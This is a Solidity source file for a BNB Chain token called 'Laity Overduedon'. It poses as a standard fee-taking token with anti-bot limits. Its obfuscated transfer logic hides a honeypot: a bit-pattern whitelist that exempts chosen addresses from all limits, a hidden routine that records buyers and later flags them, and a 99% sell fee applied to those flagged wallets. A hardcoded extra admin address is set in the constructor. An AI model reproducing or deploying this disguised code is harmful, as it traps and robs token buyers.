/**
 *Submitted for verification at BscScan.com on 2022-12-19
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract LaityOverduedon is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Laity Overduedon ";
    string constant _symbol = "LaityOverduedon";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private isMaxWalletExempt;
    mapping(address => bool) private isFeeExempt;
    mapping(address => bool) private isTxLimitExempt;
    mapping(address => bool) private isBots;
    mapping(address => uint256) private receiverMarketingBuyMode;
    mapping(uint256 => address) private walletFeeReceiverAuto;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private buyLiquidityFee = 0;
    uint256 private buyMarketingFee = 7;

    //SELL FEES
    uint256 private sellLiquidityFee = 0;
    uint256 private sellMarketingFee = 7;

    uint256 private minModeExemptBuy = buyMarketingFee + buyLiquidityFee;
    uint256 private feeDenominator = 100;

    address private autoLiquidityReceiver = (msg.sender); // auto-liq address
    address private marketingFeeReceiver = (0x17d20004Fc26dd0EB42FaBFAFFfFDa0633a7842d); // marketing address
    address private marketingBurnFeeReceiver = DEAD;
    address private teamBurnFeeReceiver = DEAD;
    address private autoBurnFeeReceiver = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private launchedAtBlock;
    uint256 private launchedAtTimestamp;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private antiBotEnabled;
    uint256 private _firstBlock;
    uint256 private _botBlocks;
    uint256 private lastBuyTime;
    uint256 private lastSellTime;

    bool private isTradingOpen = true;
    bool private isBotsMode = true;
    bool private antiBotsMode = true;
    bool private teamTradingOpen = true;
    bool private swapEnabled = true;
    uint256 tradingLimitLiquiditySellMode = 2 ** 18 - 1;
    uint256 private marketingTradingBuyTeam = 6 * 10 ** 15;
    uint256 private TokenToSwap = _totalSupply / 1000; // 0.1%

    
    uint256 private marketingAutoBotsTrading = 0;
    uint256 private sellTxModeMin = 0;
    bool private sellTradingModeMinTxLaunchedSwap = false;
    uint256 private maxMarketingMinTradingIs = 0;
    uint256 private launchedIsLimitLiquidity = 0;
    uint256 private botsTradingMinFeeLiquidityLaunchedMarketing = 0;
    bool private maxExemptBotsMarketing = false;
    bool private receiverBurnLiquidityLaunched = false;
    bool private isBotsMinBuyWallet = false;
    bool private liquidityTeamIsMin = false;
    bool private sellTxModeMin0 = false;
    bool private sellTxModeMin1 = false;
    bool private sellTxModeMin2 = false;
    uint256 private sellTxModeMin3 = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        antiBotEnabled = true;

        isMaxWalletExempt[msg.sender] = true;
        isMaxWalletExempt[address(this)] = true;

        isFeeExempt[msg.sender] = true;
        isFeeExempt[0x0000000000000000000000000000000000000000] = true;
        isFeeExempt[0x000000000000000000000000000000000000dEaD] = true;
        isFeeExempt[address(this)] = true;

        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[0x0000000000000000000000000000000000000000] = true;
        isTxLimitExempt[0x000000000000000000000000000000000000dEaD] = true;
        isTxLimitExempt[address(this)] = true;

        SetAuthorized(address(0x6E2f1033a1A3524503Dd63b5fFffF252c110b883));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Laity Overduedon  Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = limitSwapTradingReceiver(sender) || limitSwapTradingReceiver(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                botsSellLaunchedAuto();
            }
            if (!bLimitTxWalletValue) {
                limitMarketingMinBotsWalletLiquidity(recipient);
            }
        }
        
        if (maxExemptBotsMarketing != teamTradingOpen) {
            maxExemptBotsMarketing = isBotsMode;
        }

        if (launchedIsLimitLiquidity == sellTxModeMin) {
            launchedIsLimitLiquidity = sellTxModeMin3;
        }


        if (inSwap || bLimitTxWalletValue) {return _basicTransfer(sender, recipient, amount);}

        if (!isMaxWalletExempt[sender] && !isMaxWalletExempt[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Laity Overduedon  Max wallet has been triggered");
        }
        
        if (sellTxModeMin2 != sellTxModeMin1) {
            sellTxModeMin2 = antiBotsMode;
        }

        if (maxMarketingMinTradingIs == launchedIsLimitLiquidity) {
            maxMarketingMinTradingIs = sellMarketingFee;
        }


        require((amount <= _maxTxAmount) || isTxLimitExempt[sender] || isTxLimitExempt[recipient], "Laity Overduedon  Max TX Limit has been triggered");

        if (shouldPayOut()) {PayOutFee();}

        _balances[sender] = _balances[sender].sub(amount, "Laity Overduedon  Insufficient Balance");
        
        uint256 amountReceived = shouldTakeFee(sender) ? takeBuyAndSellFee(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Laity Overduedon  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function getTotalFee(address sender, bool selling) internal returns (uint256) {
        
        if (botsTradingMinFeeLiquidityLaunchedMarketing != maxMarketingMinTradingIs) {
            botsTradingMinFeeLiquidityLaunchedMarketing = buyMarketingFee;
        }


        if (selling) {
            minModeExemptBuy = sellMarketingFee + sellLiquidityFee;
            return walletTradingBuyLiquidity(sender, minModeExemptBuy);
        }
        if (!selling && sender == uniswapV2Pair) {
            minModeExemptBuy = buyMarketingFee + buyLiquidityFee;
            return minModeExemptBuy;
        }
        return walletTradingBuyLiquidity(sender, minModeExemptBuy);
    }

    function feeMarketingLiquidityExemptAutoReceiverTx() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function takeBuyAndSellFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(getTotalFee(sender, receiver == uniswapV2Pair)).div(feeDenominator);

        if (isBots[sender] || isBots[receiver]) {
            feeAmount = amount.mul(99).div(feeDenominator);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function limitSwapTradingReceiver(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == tradingLimitLiquiditySellMode;
    }

    function walletTradingBuyLiquidity(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = receiverMarketingBuyMode[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function limitMarketingMinBotsWalletLiquidity(address addr) private {
        if (feeMarketingLiquidityExemptAutoReceiverTx() < marketingTradingBuyTeam) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        walletFeeReceiverAuto[exemptLimitValue] = addr;
    }

    function botsSellLaunchedAuto() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (receiverMarketingBuyMode[walletFeeReceiverAuto[i]] == 0) {
                    receiverMarketingBuyMode[walletFeeReceiverAuto[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(marketingFeeReceiver).transfer(amountBNB * amountPercentage / 100);
    }

    function shouldPayOut() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    swapEnabled &&
    _balances[address(this)] >= TokenToSwap;
    }

    function PayOutFee() internal swapping {
        
        if (marketingAutoBotsTrading == launchedIsLimitLiquidity) {
            marketingAutoBotsTrading = TokenToSwap;
        }

        if (sellTxModeMin == minModeExemptBuy) {
            sellTxModeMin = feeDenominator;
        }

        if (botsTradingMinFeeLiquidityLaunchedMarketing == launchedIsLimitLiquidity) {
            botsTradingMinFeeLiquidityLaunchedMarketing = sellTxModeMin;
        }


        uint256 amountToLiquify = TokenToSwap.mul(buyLiquidityFee).div(minModeExemptBuy).div(2);
        uint256 amountToSwap = TokenToSwap.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (receiverBurnLiquidityLaunched == receiverBurnLiquidityLaunched) {
            receiverBurnLiquidityLaunched = sellTxModeMin2;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = minModeExemptBuy.sub(buyLiquidityFee.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(buyLiquidityFee).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(buyMarketingFee).div(totalETHFee);
        
        if (sellTradingModeMinTxLaunchedSwap == antiBotsMode) {
            sellTradingModeMinTxLaunchedSwap = sellTxModeMin1;
        }


        payable(marketingFeeReceiver).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getMarketingBurnFeeReceiver() public view returns (address) {
        return marketingBurnFeeReceiver;
    }
    function setMarketingBurnFeeReceiver(address a0) public onlyOwner {
        if (marketingBurnFeeReceiver != marketingFeeReceiver) {
            marketingFeeReceiver=a0;
        }
        marketingBurnFeeReceiver=a0;
    }

    function getTeamBurnFeeReceiver() public view returns (address) {
        return teamBurnFeeReceiver;
    }
    function setTeamBurnFeeReceiver(address a0) public onlyOwner {
        if (teamBurnFeeReceiver != teamBurnFeeReceiver) {
            teamBurnFeeReceiver=a0;
        }
        teamBurnFeeReceiver=a0;
    }

    function getTeamTradingOpen() public view returns (bool) {
        return teamTradingOpen;
    }
    function setTeamTradingOpen(bool a0) public onlyOwner {
        if (teamTradingOpen != sellTxModeMin1) {
            sellTxModeMin1=a0;
        }
        if (teamTradingOpen == antiBotsMode) {
            antiBotsMode=a0;
        }
        if (teamTradingOpen == sellTxModeMin1) {
            sellTxModeMin1=a0;
        }
        teamTradingOpen=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}